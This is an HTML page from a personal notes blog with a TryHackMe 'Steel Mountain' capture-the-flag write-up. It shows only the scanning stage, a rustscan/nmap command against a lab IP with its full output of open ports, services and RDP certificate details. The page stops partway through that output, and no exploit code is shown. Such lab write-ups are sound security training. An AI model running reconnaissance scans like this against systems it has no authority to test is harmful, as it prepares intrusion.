<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

https://tryhackme.com/r/room/steelmountain"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/posts/SteelMountain/"><meta property="og:site_name" content="Notes"><meta property="og:title" content="Steel Mountain"><meta property="og:description" content=" Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
https://tryhackme.com/r/room/steelmountain"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><meta property="article:tag" content="Rejetto"><meta property="article:tag" content="HFS"><meta property="article:tag" content="Metasploit"><meta property="article:tag" content="PowerShell"><meta property="article:tag" content="Privilege Escalation"><title>Steel Mountain | Notes</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.ico><link rel=canonical href=http://localhost:1313/posts/SteelMountain/><link rel=stylesheet href=/book.min.0f32c6312a7d9656c893156a339ea60426286a0c616f7103b1dd23999181c2ba.css integrity="sha256-DzLGMSp9llbIkxVqM56mBCYoagxhb3EDsd0jmZGBwro=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f1905837e83b2d754ab650775d24fdcac3d1a37dac209886c85bebd5aefad40f.js integrity="sha256-8ZBYN+g7LXVKtlB3XST9ysPRo32sIJiGyFvr1a761A8=" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-NWBJCFBR3S"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-NWBJCFBR3S")}</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-b42ca0b7016c34efc479bb8231f621fb class=toggle>
<label for=section-b42ca0b7016c34efc479bb8231f621fb class="flex justify-between"><a role=button>Interview Prep</a></label><ul><li><input type=checkbox id=section-5385f50ebfc88f02020a1e8c12708e8a class=toggle>
<label for=section-5385f50ebfc88f02020a1e8c12708e8a class="flex justify-between"><a role=button>Defensive</a></label><ul><li><a href=/docs/InterviewPrep/Defensive/DetectionTechniques/>Detection Techniques</a></li></ul></li></ul></li><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Try Hack Me</a></label><ul><li><a href=/docs/TryHackMe/Vulnversity/>Vulnversity</a></li><li><a href=/docs/TryHackMe/Blue/>Blue</a></li><li><a href=/docs/TryHackMe/Kenobi/>Kenobi</a></li><li><a href=/docs/TryHackMe/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/TryHackMe/DailyBugle/>Daily Bugle</a></li></ul></li><li><input type=checkbox id=section-ea05b95eb3beb76d436e21d534a09669 class=toggle>
<label for=section-ea05b95eb3beb76d436e21d534a09669 class="flex justify-between"><a role=button>Cheat Sheets</a></label><ul><li><a href=/docs/Cheat-Sheets/SANS/>Sans</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Steel Mountain</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/SteelMountain/>Steel Mountain</a></h1><h5>May 23, 2023</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/Rejetto/>Rejetto</a>,
<a href=/tags/HFS/>HFS</a>,
<a href=/tags/Metasploit/>Metasploit</a>,
<a href=/tags/PowerShell/>PowerShell</a>,
<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><blockquote><p>Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.</p></blockquote><p><a href=https://tryhackme.com/r/room/steelmountain>https://tryhackme.com/r/room/steelmountain</a></p><h1 id=scanning>Scanning
<a class=anchor href=#scanning>#</a></h1><p>Let&rsquo;s begin by scanning the target. We will first scan the target using Rustscan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>‚ùØ</span> rustscan <span style=color:#f92672>-</span>a <span style=color:#ae81ff>10.10.70.179</span> <span style=color:#f92672>--</span> <span style=color:#f92672>-</span>sVC
</span></span><span style=display:flex><span><span style=color:#f92672>.----.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span> <span style=color:#f92672>.----..---.</span>  <span style=color:#f92672>.----.</span> <span style=color:#f92672>.---.</span>   <span style=color:#f92672>.--.</span>  <span style=color:#f92672>.-.</span> <span style=color:#f92672>.-.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> {}  }<span style=color:#f92672>|</span> { } <span style=color:#f92672>|</span>{ {__ {_   _}{ {__  <span style=color:#f92672>/</span>  ___} <span style=color:#f92672>/</span> {} \ <span style=color:#f92672>|</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>|</span> <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#f92672>.-.</span> \<span style=color:#f92672>|</span> {_} <span style=color:#f92672>|.-.</span>_} } <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>.-.</span>_} }\     }<span style=color:#f92672>/</span>  <span style=color:#f92672>/</span>\  \<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>\  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39; `-&#39;</span><span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-----</span><span style=color:#e6db74>&#39;`----&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;  `----&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>---</span><span style=color:#e6db74>&#39; `-&#39;</span>  <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;`-&#39;</span> <span style=color:#960050;background-color:#1e0010>`</span><span style=color:#f92672>-</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>The Modern Day Port Scanner<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>________________________________________
</span></span><span style=display:flex><span>: http:<span style=color:#f92672>//</span>discord<span style=color:#f92672>.</span>skerritt<span style=color:#f92672>.</span>blog           :
</span></span><span style=display:flex><span>: https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>RustScan<span style=color:#f92672>/</span>RustScan :
</span></span><span style=display:flex><span> <span style=color:#f92672>--------------------------------------</span>
</span></span><span style=display:flex><span>Please contribute more quotes to our GitHub https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>rustscan<span style=color:#f92672>/</span>rustscan
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] The config file <span style=color:#f92672>is</span> expected to be at <span style=color:#e6db74>&#34;/root/.rustscan.toml&#34;</span>
</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] File limit <span style=color:#f92672>is</span> lower than default batch size<span style=color:#f92672>.</span> Consider upping <span style=color:#66d9ef>with</span> <span style=color:#f92672>--</span>ulimit<span style=color:#f92672>.</span> May cause harm to sensitive servers
</span></span><span style=display:flex><span>[<span style=color:#960050;background-color:#1e0010>!</span>] Your file limit <span style=color:#f92672>is</span> very small, which negatively impacts RustScan<span style=color:#e6db74>&#39;s speed. Use the Docker image, or up the Ulimit with &#39;</span><span style=color:#f92672>--</span>ulimit <span style=color:#ae81ff>5000</span><span style=color:#e6db74>&#39;. </span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>135</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>139</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>445</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>3389</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>5985</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>8080</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>47001</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49156</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49153</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49155</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49170</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49169</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49154</span>
</span></span><span style=display:flex><span>Open <span style=color:#ae81ff>10.10.70.179</span>:<span style=color:#ae81ff>49152</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] Starting Script(s)
</span></span><span style=display:flex><span>[<span style=color:#f92672>&gt;</span>] Running script <span style=color:#e6db74>&#34;nmap -vvv -p {{port}} {{ip}} -sVC&#34;</span> on ip <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Depending on the complexity of the script, results may take some time to appear<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>[<span style=color:#f92672>~</span>] Starting Nmap <span style=color:#ae81ff>7.93</span> ( https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org ) at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span> EDT
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Script Pre<span style=color:#f92672>-</span>scanning<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>10.10.70.179</span> [<span style=color:#ae81ff>4</span> ports]
</span></span><span style=display:flex><span>Completed Ping Scan at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>0.22</span>s elapsed (<span style=color:#ae81ff>1</span> total hosts)
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host<span style=color:#f92672>.</span> at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host<span style=color:#f92672>.</span> at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>0.11</span>s elapsed
</span></span><span style=display:flex><span>DNS resolution of <span style=color:#ae81ff>1</span> IPs took <span style=color:#ae81ff>0.11</span>s<span style=color:#f92672>.</span> Mode: Async [<span style=color:#75715e>#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>10.10.70.179</span> [<span style=color:#ae81ff>15</span> ports]
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>3389</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>8080</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>135</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>47001</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49170</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49153</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49154</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49156</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49155</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49152</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>49169</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Discovered open port <span style=color:#ae81ff>5985</span><span style=color:#f92672>/</span>tcp on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>, <span style=color:#ae81ff>0.27</span>s elapsed (<span style=color:#ae81ff>15</span> total ports)
</span></span><span style=display:flex><span>Initiating Service scan at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>
</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>15</span> services on <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Service scan Timing: About <span style=color:#ae81ff>53.33</span><span style=color:#f92672>%</span> done; ETC: <span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>00</span> (<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>49</span> remaining)
</span></span><span style=display:flex><span>Completed Service scan at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>76.97</span>s elapsed (<span style=color:#ae81ff>15</span> services on <span style=color:#ae81ff>1</span> host)
</span></span><span style=display:flex><span>NSE: Script scanning <span style=color:#ae81ff>10.10.70.179</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>1</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>5.85</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>2</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>0.54</span>s elapsed
</span></span><span style=display:flex><span>NSE: Starting runlevel <span style=color:#ae81ff>3</span> (of <span style=color:#ae81ff>3</span>) scan<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Initiating NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span>Completed NSE at <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>59</span>, <span style=color:#ae81ff>0.00</span>s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10.70.179</span>
</span></span><span style=display:flex><span>Host <span style=color:#f92672>is</span> up, received reset ttl <span style=color:#ae81ff>125</span> (<span style=color:#ae81ff>0.13</span>s latency)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Scanned at <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span> <span style=color:#ae81ff>22</span>:<span style=color:#ae81ff>58</span>:<span style=color:#ae81ff>33</span> EDT <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>84</span>s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE            REASON          VERSION
</span></span><span style=display:flex><span><span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp    open  http               syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft IIS httpd <span style=color:#ae81ff>8.5</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Microsoft<span style=color:#f92672>-</span>IIS<span style=color:#f92672>/</span><span style=color:#ae81ff>8.5</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>methods: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Site doesn<span style=color:#e6db74>&#39;t have a title (text/html).</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>135</span><span style=color:#f92672>/</span>tcp   open  msrpc              syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>139</span><span style=color:#f92672>/</span>tcp   open  netbios<span style=color:#f92672>-</span>ssn        syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows netbios<span style=color:#f92672>-</span>ssn
</span></span><span style=display:flex><span><span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp   open  microsoft<span style=color:#f92672>-</span>ds       syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span> Microsoft Windows Server <span style=color:#ae81ff>2008</span> R2 <span style=color:#f92672>-</span> <span style=color:#ae81ff>2012</span> microsoft<span style=color:#f92672>-</span>ds
</span></span><span style=display:flex><span><span style=color:#ae81ff>3389</span><span style=color:#f92672>/</span>tcp  open  ssl<span style=color:#f92672>/</span>ms<span style=color:#f92672>-</span>wbt<span style=color:#f92672>-</span>server<span style=color:#960050;background-color:#1e0010>?</span> syn<span style=color:#f92672>-</span>ack ttl <span style=color:#ae81ff>125</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> ssl<span style=color:#f92672>-</span>cert: Subject: commonName<span style=color:#f92672>=</span>steelmountain
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Issuer: commonName<span style=color:#f92672>=</span>steelmountain
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Public Key type: rsa
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Public Key bits: <span style=color:#ae81ff>2048</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Signature Algorithm: sha1WithRSAEncryption
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Not valid before: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span>T02:<span style=color:#ae81ff>56</span>:<span style=color:#ae81ff>08</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Not valid after:  <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>11</span><span style=color:#f92672>-</span><span style=color:#ae81ff>22</span>T02:<span style=color:#ae81ff>56</span>:<span style=color:#ae81ff>08</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> MD5:   <span style=color:#ae81ff>6e4</span>d153ae7ee1b320d9d72afe32c2c46
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> SHA<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>: a0ccbed37da0eee5c10a1ebd4d6076f8f937545e
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#f92672>-----</span>BEGIN CERTIFICATE<span style=color:#f92672>-----</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> MIIC3jCCAcagAwIBAgIQautoTBW<span style=color:#f92672>/+</span>rhJokpnnG26hjANBgkqhkiG9w0BAQUFADAY
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTI0MDUyMzAyNTYwOFoXDTI0MTEy
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> MjAyNTYwOFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> AQEBBQADggEPADCCAQoCggEBAN3PQ47ytbMM3aObC6EF69B0V7Iex2ys1WYOJZGo
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#ae81ff>8</span>CDMjdF29eM0rBRlEc7xuXQRX8UM7IkKUORcRHJsklrJgtvDg6q8LKucJL4Zj55k
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#ae81ff>5</span>lO2yzBlgPFg1X5zFjlXEu<span style=color:#f92672>+</span>Ytg8u7Q0WndlU28Jq4bYmspuapajhB97pPxdJ3cv4
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Q32mZE4cwyXIRE<span style=color:#f92672>/</span>CCX7RvTLpFUXJT2Vqu917y8XUeXI4uO1zMU6F5PRyLLx1T3MS
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> Kq<span style=color:#f92672>/</span>IN4FvqE8Af<span style=color:#f92672>+</span>T9UYkGCD<span style=color:#f92672>+</span>TXrIG14RZ7GisgoeR5BXnB7wPhRhJfb0NjpAeWSu3
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> vJE<span style=color:#f92672>+</span>RzlcGzszwxoBdR<span style=color:#f92672>/</span>E<span style=color:#f92672>/</span>ufXbJX8FY69o9YiUNrG8VVkoDMCAwEAAaMkMCIwEwYD
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> AQBG<span style=color:#f92672>/</span>Ec<span style=color:#f92672>+</span>cj2a6PMxM7aUswvDGShDvneTBiwDcjRQmz4Vo7z3M5KLku1tTmgzHp<span style=color:#f92672>/</span>O
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#ae81ff>1</span>IH9aNmXWZK2VA42i6bKLIuJ57<span style=color:#f92672>/</span><span style=color:#ae81ff>7</span>AhAwMbDIgFdck2ddkXGHP11qe2GroMExUEA8
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> W7xRe8<span style=color:#f92672>+</span>RQ37ytWxB7fEn9VXAMsnV3h8bby1uNmnrmVoGbfMiP0Y6i2NijngVAJrf
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> <span style=color:#f92672>/</span>tBVFR7rjwjhg7b9GiDTXlnFNjZI<span style=color:#f92672>/</span>Wo9ThfhWR3grvEOMoPKaBUPkG7QzCQpoeDw
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> uA8gTVdJTTqoIaVQGvG5w1<span style=color:#f92672>+</span>xj1NQplP86<span style=color:#f92672>/</span>UZhVVQy<span style=color:#f92672>/</span>TzNJMtiRqhJeH1MAyaZTO7
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> NnTbtK6ktlldHTWURZkG9J2P
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_<span style=color:#f92672>-----</span>END CERTIFICATE<span style=color:#f92672>-----</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> rdp<span style=color:#f92672>-</span>ntlm<span style=color:#f92672>-</span>info: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Target_Name: STEELMOUNTAIN
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   NetBIOS_Domain_Name: STEELMOUNTAIN
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   NetBIOS_Computer_Name: STEELMOUNTAIN
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   DNS_Domain_Name: steelmountain
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   DNS_Computer_Name: steelmountain
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   Product_Version: <span style=color:#ae81ff>6.3.9600</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  System_Time: <span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>T02:<span style=color:#ae81ff>59</span>:<span style=color:#ae81ff>51</span><span style=color:#f92672>+</span><span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>
